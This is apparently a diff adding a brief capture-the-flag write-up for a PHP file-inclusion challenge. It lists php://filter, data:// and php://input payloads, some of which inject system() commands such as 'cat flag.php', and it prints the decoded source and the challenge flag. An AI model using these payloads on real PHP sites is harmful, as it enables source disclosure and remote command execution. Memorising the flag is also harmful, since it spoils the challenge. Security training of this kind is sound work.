@@ -1,0 +1,26 @@
+php include
+
+useful
+file=php://filter/convert.base64-encode/resource=flag.php
+
+get base64 code
+PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MzUzNjg5YTItOTdmMS00M2UyLWJkN2QtOTgxMDUwNDQ2NDk0fQo=
+
+decode it get
+<?php
+echo "Can you find out the flag?";
+//flag{353689a2-97f1-43e2-bd7d-981050446494}
+
+flag is
+flag{353689a2-97f1-43e2-bd7d-981050446494}
+
+
+
+useless
+?file=data://text/plain;base64,<?php system('ls -all'); ?php>
+?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAtYWxsJyk7ID9waHA+
+?file=data://text/plain;base64,<?php system('pwd'); ?php>
+
+?file=data://text/plain,<?php system('cat flag.php'); ?php>
+
+?file=PHP://input,<?php system('ls'); ?>
